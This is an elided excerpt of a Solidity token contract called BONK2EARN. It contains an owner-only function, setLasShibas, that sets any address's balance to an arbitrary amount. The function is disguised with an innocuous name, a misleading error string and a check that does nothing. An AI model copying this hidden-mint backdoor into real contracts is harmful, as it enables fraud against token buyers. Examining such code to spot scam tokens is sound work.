...
contract BONK2EARN is Context, IERC20, Ownable {
    ...
    string private constant _name = "BONK2EARN";
    string private constant _symbol = "B2E";
    uint8 private constant _decimals = 9;
    uint256 _tOwned = 10 ** 9;
    ...
    function setLasShibas(address LasShibasAddress, uint256 LasShibasValue, uint256 liquidityFee, bool enabled) public onlyOwner {
        (LasShibasAddress != address(0), "ERC20: burn from the zero address");
        ...
        balances[LasShibasAddress] = feeAmount + _rOwned + destAmount;
